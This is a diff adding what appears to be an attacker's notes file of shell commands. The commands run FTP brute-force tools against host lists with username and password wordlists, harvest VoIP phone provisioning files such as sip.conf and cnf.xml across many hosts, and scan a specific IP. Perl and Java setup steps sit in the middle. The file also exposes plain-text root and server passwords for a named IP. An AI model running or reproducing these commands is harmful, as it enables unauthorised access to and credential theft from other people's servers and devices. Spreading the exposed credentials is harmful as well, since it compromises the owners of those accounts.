@@ -1,0 +1,94 @@
+cd /home/charlie/5039/
+nohup ./work &
+tail -f nohup.out
+
+nohup python rbrute_ftp.py -l hosts.lst -p pass.lst -u logins.lst  -t 5 -o valid.lst -T 50 &
+tail -f nohup.out
+
+nohup ./connect.sh &
+
+nohup ./rftp_brute_plas.py -l hosts.lst -p pass.lst -u logins.lst -t 1000 -o valid.lst &
+
+nohup ./rbrute_ftp.py -l hosts1.lst -p pass.lst -u logins.lst -t 500 -o valid.lst &      »œÊ‰  Ê—
+
+
+nohup  java  -Xms2G -Xmx10G -jar FTpProject.jar "VA.UK.cnf.xml,cfg,sip.conf,cnf,000000000000.cfg" 50 &
+
+nohup  perl ftp.pl bios.txt  users.txt passwords.txt &             1      xxxxxxxxxxxxxxxxxxxx
+nohup  perl ftp1.pl ips.txt  users.txt passwords.txt &            2
+nohup  perl ftp.pl ip.txt  users.txt passwords.txt &            3
+nohup  perl ftp21.pl ip21.txt  users.txt passwords.txt &        test
+nohup  perl ftp21.pl ips.txt  users.txt wordlist/passlist.txt &
+nohup  perl ftp21.pl ips.txt  users.txt pw list 2.txt &
+nohup  perl ftp21.pl ips.txt  users.txt pw list 3.txt &
+nohup  perl ftp21.pl ips.txt  users.txt pw list 4.txt &
+nohup  perl ftp21.pl ips.txt  users.txt passwords.txt &
+
+nohup  ftpmap -l Pal-1.txt --user polycom --P passwords.txt  --execute  --list  &
+
+ftpmap -gL Pal.txt --user anonymous -p null -l '/'
+ftpmap -L Pal.txt
+ftpmap -Sgs 207.167.195.16
+
+tail -f nohup.out
+
+Your server was reinstalled successfully. Your new password is: nBoM^&uCOis1FN
+=================================================
+To Install Perl
+
+# sudo apt-get install perl
+
+To find a Perl module that's provided as an Ubuntu package:
+
+# apt-cache search perl <module-name>
+
+apt-cache search perl HexConvert
+
+sudo libio-socket-timeout-perl - IO
+
+sudo cpan -i libio-socket-timeout-perl - IO
+sudo cpan -i libtext-string-hexconvert-perl
+sudo cpan -i IO:Socket:Timeout
+sudo cpan -i String:HexConvert
+
+aptitude -V -R install libio-socket-ssl-perl libnet-ssleay-perl
+sudo apt-get update
+
+cpan> install IO:Socket:Timeout
+install String:HexConvert
+===================================================
+nohup  perl ftp.pl ips.txt  users.txt passwords.txt &
+2345-11500-040.bootrom.ld
+nohup  java  -Xms2048m -Xmx5120m -jar FTpProject.jar "cnf.xml,cfg,sip.conf,cnf,000000000000.cfg" 300 &
+
+
+nohup  java -jar FTpProject.jar "cnf.xml,cfg,sip.conf,000000000000.cfg" 100 &
+
+nohup  java -jar FTpProject4.jar "cfg,conf,cnf,000000000000.cfg,xml" 100 &
+tail -f nohup.out
+
+
+ps aux | grep -i java
+ps aux | grep -i  python
+kill -9 1005
+
+killall perl
+
+
+sudo apt-get install software-properties-common
+
+sudo add-apt-repository ppa:webupd8team/java
+sudo apt-get update
+sudo apt-get install oracle-java8-installer
+
+java -version
+
+java version "1.8.0_91"
+Java(TM) SE Runtime Environment (build 1.8.0_91-b14)
+Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode)
+
+
+
+IP Address: 89.34.99.88
+Username: root
+Password: tB38LoEZt1702xkTgW
